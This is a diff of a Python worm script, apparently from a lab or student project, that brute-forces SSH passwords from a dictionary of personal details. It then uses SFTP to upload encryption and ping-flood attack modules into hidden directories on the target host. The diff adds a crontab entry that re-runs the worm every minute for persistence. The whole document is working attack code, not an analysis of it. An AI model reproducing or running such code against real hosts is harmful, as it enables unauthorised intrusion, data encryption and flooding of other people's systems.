@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 from itertools import permutations
 from sys import argv
 import paramiko 
@@ -7,11 +8,13 @@ import stat
 HOST = argv[1]
 USERNAME = 'attacker'
 TESTPASSWD = 'YH0228'
-TARGET_DIR_1 = '/home/attacker/Public/.Simple_Worm'
-TARGET_DIR_2 = '/home/attacker/Desktop/.Backup'
+TARGET_DIR_1 = '/home/attacker/Public/.Simple_Worm/'
+TARGET_DIR_2 = '/home/attacker/Desktop/.Backup/'
 ATTACK_MODULE_RSA = './RSA_Encrypt'
 ATTACK_MODULE_FLOOD = './Loop_ping'
-
+CRONTAB_CMD = 'crontab_worm.sh'
+CRONTAB_JOB = '*/1 * * * * test -e ' + TARGET_DIR_1 + CRONTAB_CMD + ' && ' + TARGET_DIR_1 + CRONTAB_CMD + ' 1 || ' + TARGET_DIR_2 + CRONTAB_CMD + ' 2'
+CRONTAB_WRITE = 'crontab -l | { cat; echo \"%s\"; } | crontab -' % CRONTAB_JOB
 
 def ssh_connect(passwd, host):
 	try:
@@ -49,35 +52,43 @@ def sftp_upload(local_path, remote_path):
 		sftp.chmod(local_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH)
 	except Exception as e:
 		print(local_path, ' upload fail! ', e)
+		return False
+	return True
 	
 
 
-dictionary = ['YueHan', 'Wang', 'YH', '1999',
-              '0228', 'oscar', 'Realtek', '@', '_']
+dictionary = ['YH', '0228', 'YueHan', 'Wang', 
+              '1999', 'oscar', 'Realtek', '@', '_']
 possible_passwd = [p[0] + p[1] for p in permutations(dictionary, 2)]
-print(possible_passwd)
+#print(possible_passwd)
 
 
 ssh = paramiko.SSHClient()
 # add trusted server to host_allow
 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 # try each password
+correct_passwd = TESTPASSWD
 for p in possible_passwd:
-	p = TESTPASSWD
 	if ssh_connect(p, HOST):
 		correct_passwd = p
 		break
 
-print('passwd: ', correct_passwd)
-		
-stdin, stdout, stderr = ssh.exec_command('df -hl')
-print(stdout.read().decode())
 
+# sftp connect and transfer
 client = paramiko.Transport((HOST, 22))
 if sftp_connect(correct_passwd):
 	sftp = paramiko.SFTPClient.from_transport(client)
-	sftp_upload(ATTACK_MODULE_RSA, TARGET_DIR_1)
-	sftp_upload(ATTACK_MODULE_RSA, TARGET_DIR_2)
-	sftp_upload(ATTACK_MODULE_FLOOD, TARGET_DIR_1)
-	sftp_upload(ATTACK_MODULE_FLOOD, TARGET_DIR_2)
+	upload_list = [(ATTACK_MODULE_RSA, TARGET_DIR_1), (ATTACK_MODULE_RSA, TARGET_DIR_2), 
+			(ATTACK_MODULE_FLOOD, TARGET_DIR_1), (ATTACK_MODULE_FLOOD, TARGET_DIR_2),
+			(CRONTAB_CMD, TARGET_DIR_1), (CRONTAB_CMD, TARGET_DIR_2)]
+	# send until all succeed
+	for u in upload_list:
+		while not sftp_upload(u[0], u[1]):
+			pass
 
+# write the crontab
+stdin, stdout, stderr = ssh.exec_command(CRONTAB_WRITE)
+print(stdout.read().decode())
+
+ssh.close()
+sftp.close()
